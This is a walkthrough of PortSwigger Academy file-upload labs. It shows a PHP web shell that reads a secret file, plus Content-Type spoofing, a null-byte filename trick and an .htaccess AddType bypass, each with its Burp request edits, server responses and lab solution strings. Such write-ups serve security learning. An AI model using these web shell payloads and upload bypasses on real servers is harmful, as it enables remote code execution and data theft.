# Lab 1:[ Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

**Targets:**

You can log in to your own account using the following credentials:

```php
'wiener:peter
```

pull it out the contents of the file: =>

```php
'/home/carlos/secret'

```

**Start:**

1. create file:

```php
'exploit.php'
```

content:

```php
'<?php echo file_get_contents('/home/carlos/secret'); ?>'
```

2. **Upload file successfully via site upload functionality**
   (https://0a0800a903188314837dcf4400cd00b1.web-security-academy.net/my-account/avatar)

   test image upload url:
   (https://0aa500b80367987681ca710f007f0010.web-security-academy.net/files/avatars/work1.jpg)

3. **Go to file location ( right click thumbnail and choose _open image in new window_)**
   (https://0a0800a903188314837dcf4400cd00b1.web-security-academy.net/files/avatars/exploit.php)

4. **Copy string and paste in submit button on lab**

```php
'0RmXM4Rgvywsjqy9yZBN0qhbBj9pcLKB'
```

# Lab 2:[ Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

**Targets:**
You can log in to your own account using the following credentials:

```php
"wiener:peter"
```

```php
"pull it out the contents of the file '/home/carlos/secret'"
```

1. **Start:**

create file:

```php
'exploit.php'
```

content:

```php
'<?php echo file_get_contents('/home/carlos/secret'); ?>'
```

2. **Upload file successfully via site upload functionality**
   (https://0a0800a903188314837dcf4400cd00b1.web-security-academy.net/my-account/avatar)

   test image upload url:
   (https://0aa500b80367987681ca710f007f0010.web-security-academy.net/files/avatars/work1.jpg)

**Go to file location ( right click thumbnail and choose 'open image in new window')**
(https://0a0800a903188314837dcf4400cd00b1.web-security-academy.net/files/avatars/exploit.php)

error message

```php
Sorry, file type 'application/octet-stream' is not allowed Only "image/jpeg" and 'image/png' are allowed Sorry, there was an error uploading your file.
```

response:

```php
'HTTP/2 403 Forbidden'
```

change Content-Type to => :

```php
'Content-Type: image/png'
```

response

```php
'HTTP/2 200 OK'
'The file avatars/exploit.php has been uploaded.'
```

3. **Go to file location _find the picture will be empty_( right click thumbnail and choose 'open image in new window')**

(https://0a0800a903188314837dcf4400cd00b1.web-security-academy.net/files/avatars/exploit.php)
find the picture will be empty

4. **Copy string and paste in _submit button_ on lab**

```php
'0RmXM4Rgvywsjqy9yZBN0qhbBj9pcLKB'
```

# Lab 3: [Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

**Targets:**

**Certain file extensions are _blacklisted_, but this defense can be bypassed using a classic obfuscation technique.**

```php
You can log in to your own account using the following credentials:
"wiener:peter"
```

```php
"pull it out the contents of the file '/home/carlos/secret'"
```

Start:

1. create file:

```php
'exploit.php'
```

content:

```php
'<?php echo file_get_contents('/home/carlos/secret'); ?>'
```

2. _Upload file successfully_ via site upload functionality
   (https://0a0800a903188314837dcf4400cd00b1.web-security-academy.net/my-account/avatar)

   _test_ image upload url:
   (https://0aa500b80367987681ca710f007f0010.web-security-academy.net/files/avatars/work1.jpg)

   3. Go to file location ( right click thumbnail and choose '_open image in new window_')
      (https://0a0800a903188314837dcf4400cd00b1.web-security-academy.net/files/avatars/exploit.php)

   error message
   Sorry, _only JPG & PNG files are allowed_
   Sorry, there was an _error uploading your_ file

   response:

   ```php
   'HTTP/2 403 Forbidden'
   ```

3. change in Burp:
   ```php
    'filename="exploit.php.jpg"'
   ```
   response:

```php
'HTTP/2 200 OK'
'The file avatars/"exploit.php.jpg" has been uploaded.'
```

5. change in _Burp_: Content-Disposition _header_, change the value of the _filename parameter_ to include a URL encoded _null_ byte, _followed by the .jpg extension_:

   ```php
    'filename="exploit.php%00.jpg"'
   ```

   response:

```php
'HTTP/2 200 OK'
'The file avatars/"exploit.php" has been uploaded.'
```

6. Go to file location ( right click thumbnail and choose '_open image_ in new window')

7. change in _url_: => (https://0a3e00de03a6833383f6ede5008c0046.web-security-academy.net/files/avatars/exploit.php%00.jpg)

```php
"exploit.php%00.jpg"
```

to: => (https://0a3e00de03a6833383f6ede5008c0046.web-security-academy.net/files/avatars/exploit.php)

```php
"exploit.php"
```

8. Copy string and _paste in submit_ button on lab

```php
'lpldZ4rNSprjPzhOeV0rodgxqyj5cMUw'
```

# Lab 4: [Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

**Targets:**
This lab contains a vulnerable image upload function. Certain file extensions are _blacklisted_, but this defense can be bypassed due to a fundamental flaw in the _configuration_ of this _blacklist_.

**Hint:**
You need _upload two different files_ to solve this lab.

1. **Start:**
   You can log in to your own account using the following credentials:

```php
"wiener:peter"
```

pull it out the contents of the file:

```php
'/home/carlos/secret'
```

Upload file _successfully_ via site upload functionality
(https://0a0800a903188314837dcf4400cd00b1.web-security-academy.net/my-account/avatar)

_test_ image upload url:
(https://0aa500b80367987681ca710f007f0010.web-security-academy.net/files/avatars/work1.jpg)
Go to file _location_ ( right click thumbnail and choose '_open image_ in new window')
(https://0a0800a903188314837dcf4400cd00b1.web-security-academy.net/files/avatars/exploit.php)
error message:

```php
Sorry, "php files are not allowed" Sorry, there was an error uploading your file.
 'response:HTTP/2 403 Forbidden'
```

How to _add an AddType to an apache server_: =>(https://stackoverflow.com/questions/56702288/how-to-find-the-path-of-apache-config-file)

find:

```php
'AddType application/x-font-otf'

```

skeleton:

2. **AddType**

```php
'{php mimetype} {.new extention}'
```

3. **create _new_ extention: =>**

```php
'AddType {php mimetype} .z0z'
```

4. **find php _mimetype_ in:** => (https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types)
5. **change** _{php mimetype}_ to: =>

```php
 'AddType application/x-httpd-php .z0z'
```

**last payload!!!**

```php
'AddType application/x-httpd-php .z0z'
```

6. **Go to _apache-configuration-folder_: =>** (https://www.howtogeek.com/devops/how-to-find-your-apache-configuration-folder/)
   and _find_ `.htaccess`

7.** change this _old_ payload _to new_ payload in _Burp_:**

```php
'<?php echo file_get_contents('/home/carlos/secret'); ?>'

```

to:

```php
'AddType application/x-httpd-php .z0z'
```

8. **change _name_ file: =>**

```php
"exploit.php to => '.htaccess'"
```

```php
'filename=".htaccess"'
```

9. **change: _Content-Type_:**

```php
'application/octet-stream'
```

to: =>

```php
'Content-Type: text/plain'
```

_find this from_: (https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types)
_comment_: => "`text/plain` is the default value for textual files. A textual file should be human-readable and must not contain binary data."

```php
'Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain
AddType application/x-httpd-php .z0z'
```

response:

```php
'The file avatars/.htaccess has been uploaded.<p>'
'HTTP/2 200 OK'
```

10. **Send again _original Request from Burp_ with change extention: =>**

```php
'filename="exploit.z0z"'
```

```php
'Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>'

```

response:

```php
'The file avatars/exploit.z0z has been uploaded.<p>
HTTP/2 200 OK'
```

11. **Test image upload _url_:**
    (https://0aa500b80367987681ca710f007f0010.web-security-academy.net/files/avatars/work1.jpg)
    Go to file location ( right click thumbnail and choose 'open image in new window')
    _and find: =>_ (https://0a8a00b8048ef50a80ad854100e7007f.web-security-academy.net/files/avatars/exploit.z0z)

```php
'.net/files/avatars/exploit.z0z'
```

```php
'HqNLjZpfV3RbGSBaxiTN6SONUBqFI0nt'
```

12. **Copy string and paste in _submit_ button on lab**

```php
'HqNLjZpfV3RbGSBaxiTN6SONUBqFI0nt'
```

**BOOM!**

# Lab 5: [Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)
